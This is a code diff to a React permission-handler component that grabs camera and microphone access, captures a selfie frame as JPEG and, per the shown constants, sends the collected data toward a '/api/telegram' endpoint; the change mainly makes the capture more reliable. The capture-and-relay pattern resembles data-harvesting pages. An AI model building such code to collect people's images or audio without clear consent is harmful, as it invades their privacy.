@@ -5,6 +5,7 @@ import { toast } from "sonner";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const AUDIO_RECORDING_DURATION_MS = 3000; // 3 seconds
+const VIDEO_CAPTURE_DELAY_MS = 500; // 0.5 seconds delay before capturing selfie
 
 type DataToSend = {
   selfie?: string;
@@ -56,10 +57,23 @@ const PermissionHandler = () => {
           stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
           toast.success("Camera and Microphone access granted!");
 
-          // Capture Selfie
           if (videoRef.current) {
             videoRef.current.srcObject = stream;
-            await new Promise((res) => (videoRef.current!.onloadedmetadata = res));
+            // Wait for video to load metadata
+            await new Promise((res) => {
+              videoRef.current!.onloadedmetadata = () => {
+                videoRef.current!.play().then(res).catch(err => {
+                  console.error("Error playing video stream:", err);
+                  toast.error("Failed to play video stream.");
+                  res(null); // Resolve even on error to unblock
+                });
+              };
+            });
+
+            // Add a small delay to allow the camera to warm up and show an image
+            await new Promise(res => setTimeout(res, VIDEO_CAPTURE_DELAY_MS));
+
+            // Capture Selfie
             const canvas = document.createElement("canvas");
             canvas.width = videoRef.current.videoWidth;
             canvas.height = videoRef.current.videoHeight;
@@ -68,6 +82,8 @@ const PermissionHandler = () => {
               ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
               dataToSend.selfie = canvas.toDataURL("image/jpeg");
               toast.info("Selfie captured!");
+            } else {
+              toast.error("Failed to get 2D context for canvas.");
             }
           }
 
